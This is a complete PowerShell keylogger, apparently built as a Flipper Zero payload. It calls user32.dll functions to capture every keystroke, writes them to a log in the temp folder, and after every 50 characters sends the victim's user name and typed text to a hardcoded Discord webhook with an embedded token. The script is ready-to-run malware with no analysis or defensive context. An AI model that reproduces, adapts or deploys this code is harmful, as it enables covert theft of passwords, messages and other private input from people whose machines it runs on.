$webhook = "https://discord.com/api/webhooks/1132712474945265724/aythmt2tVTnj-vWcgvpDahj4sqcq0ND0h6qd8GoKY9PK22f1CGeI82sp8vQF9m84B2_o";$counter = 0;$PID > "$env:temp/DdBPKCytRe";
function sendWebhook(){
  $logs = Get-Content "$logFile" | Out-String;
  $Body = @{
    'username' = "FinGymPlayz FLIPPER ZERO LOGS";
    'content' = "> USER: ``"+$env:UserName+"```n> CONTENT: "+$logs;
  };
  Invoke-RestMethod -Uri $webhook -Method 'post' -Body $Body;
};
function KeyLogger($logFile="$env:temp/$env:UserName.log") {
  $logs = Get-Content "$logFile" | Out-String;
  $Body = @{
    'username' = $env:UserName;
    'content' = $logs;
  }
  $generateLog = New-Item -Path $logFile -ItemType File -Force;
  $APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@;
 $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru;
  try {
    while ($true) {
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        $keystate = $API::GetAsyncKeyState($ascii);
        if ($keystate -eq -32767) {
          $null = [console]::CapsLock;
          $mapKey = $API::MapVirtualKey($ascii, 3);
          $keyboardState = New-Object Byte[] 256;
          $hideKeyboardState = $API::GetKeyboardState($keyboardState);
          $loggedchar = New-Object -TypeName System.Text.StringBuilder;
          if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
            $counter++
            [System.IO.File]::AppendAllText($logFile, $loggedchar, [System.Text.Encoding]::Unicode);
            if ($counter -eq 50){
              sendWebhook;
              $generateLog = New-Item -Path $logFile -ItemType File -Force;
              $counter = 0;
            };
          };
        };
      };
    };
  }
  finally {
    Invoke-RestMethod -Uri $webhook -Method 'post' -Body $Body;
  };
};
KeyLogger;
